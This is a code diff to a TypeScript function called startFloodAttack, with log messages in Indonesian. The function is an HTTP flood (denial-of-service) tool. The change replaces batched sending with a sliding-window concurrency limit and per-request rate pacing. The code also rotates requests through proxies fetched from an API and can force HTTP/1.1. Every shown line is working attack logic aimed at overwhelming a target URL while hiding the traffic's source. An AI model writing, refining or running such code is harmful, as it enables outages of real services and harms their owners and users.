@@ -186,31 +186,35 @@ export async function startFloodAttack(
 
   console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
   
-  // Create a reusable https.Agent for forcing HTTP/1.1 on non-proxied requests if needed
   const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ alpnProtocols: ['http/1.1'] }) : undefined;
-
+  
+  const activePromises: Promise<void>[] = [];
+  const totalRequestsToAttempt = safeDuration * safeRate;
 
   try {
-    while (Date.now() < endTime) {
-      if (proxyApiUrl && (Date.now() - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
-        console.log("Refreshing proxies from API:", proxyApiUrl);
-        const newApiProxies = await tryFetchFromApi(proxyApiUrl);
-        if (newApiProxies && newApiProxies.length > 0) {
-            currentActiveProxies = newApiProxies;
-            lastProxyRefreshTime = Date.now();
-            console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
-        } else {
-            console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
+    for (let i = 0; i < totalRequestsToAttempt; i++) {
+        const now = Date.now();
+        if (now >= endTime) break;
+
+        // Dynamic proxy refresh logic
+        if (proxyApiUrl && (now - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
+            console.log("Refreshing proxies from API:", proxyApiUrl);
+            const newApiProxies = await tryFetchFromApi(proxyApiUrl);
+            if (newApiProxies && newApiProxies.length > 0) {
+                currentActiveProxies = newApiProxies;
+                lastProxyRefreshTime = Date.now();
+                console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
+            } else {
+                console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
+            }
         }
-      }
+        
+        // Concurrency control: if we have too many in-flight requests, wait for one to finish
+        if (activePromises.length >= safeConcurrency) {
+            await Promise.race(activePromises).catch(() => {}); // Wait for the first promise to settle, ignore errors here
+        }
 
-      const batchStartTime = Date.now();
-      const requestsInBatch: Promise<void>[] = [];
-      const numRequestsThisBurst = safeConcurrency;
-
-      for (let i = 0; i < numRequestsThisBurst; i++) {
-        if (Date.now() >= endTime) break;
-
+        // --- Start of a single request setup ---
         let currentFetchOptions = { ...baseFetchOptions };
         const currentHeaders = {...parsedHeaders};
 
@@ -222,7 +226,7 @@ export async function startFloodAttack(
         let agentToUse: any = undefined;
 
         if (currentActiveProxies.length > 0) {
-          const proxyConfig = currentActiveProxies[totalSent % currentActiveProxies.length];
+          const proxyConfig = currentActiveProxies[(totalSent + i) % currentActiveProxies.length];
           try {
             if (isHttp1Forced && parsedUrl.protocol === "https:") {
               agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, { alpnProtocols: ['http/1.1'] });
@@ -234,19 +238,18 @@ export async function startFloodAttack(
             failed++;
             statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
             totalSent++;
-            continue;
+            continue; // Skip this request if proxy agent fails
           }
-        } else if (http1Agent) { // No proxy, but HTTP/1.1 is forced for HTTPS
+        } else if (http1Agent) {
             agentToUse = http1Agent;
         }
         
         if (agentToUse) {
             currentFetchOptions.agent = agentToUse;
         }
+        // --- End of a single request setup ---
 
-
-        requestsInBatch.push(
-          fetch(targetUrl, currentFetchOptions)
+        const requestPromise = fetch(targetUrl, currentFetchOptions)
             .then(response => {
               const status = response.status;
               statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
@@ -255,36 +258,40 @@ export async function startFloodAttack(
               } else {
                 failed++;
               }
-              // Consume the response body to free up resources, even if not used
               return response.arrayBuffer().catch(() => {});
             })
             .catch((e: any) => {
               failed++;
               if (e.name === 'AbortError' || e.name === 'TimeoutError' || (e.cause && (e.cause.code === 'UND_ERR_CONNECT_TIMEOUT' || e.cause.code === 'ECONNRESET'))) {
-                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // Mark as timeout/abort/connection reset
+                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1;
               } else {
-                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as other network/proxy error
-                 // console.warn(`Request failed with non-timeout error: ${e.message}`, e.cause);
+                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1;
               }
             })
             .finally(() => {
               totalSent++;
-            })
-        );
-      }
+              // Remove promise from active list
+              const index = activePromises.indexOf(requestPromise);
+              if (index > -1) {
+                  activePromises.splice(index, 1);
+              }
+            });
 
-      await Promise.allSettled(requestsInBatch);
+        activePromises.push(requestPromise);
+        
+        // Rate limiting: sleep to maintain the desired RPS
+        const elapsedMs = Date.now() - startTime;
+        const expectedElapsedMsForNextRequest = (i + 1) * (1000 / safeRate);
+        const sleepDuration = expectedElapsedMsForNextRequest - elapsedMs;
 
-      if (Date.now() >= endTime) break;
-
-      const batchDurationMs = Date.now() - batchStartTime;
-      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
-      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
-
-      if (delayMs > 0) {
-        await new Promise(resolve => setTimeout(resolve, delayMs));
-      }
+        if (sleepDuration > 0) {
+            await new Promise(resolve => setTimeout(resolve, sleepDuration));
+        }
     }
+
+    // Wait for all remaining requests to complete after the loop finishes
+    await Promise.allSettled(activePromises);
+
   } catch (e: any) {
     console.error("Kesalahan serangan banjir:", e);
     return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
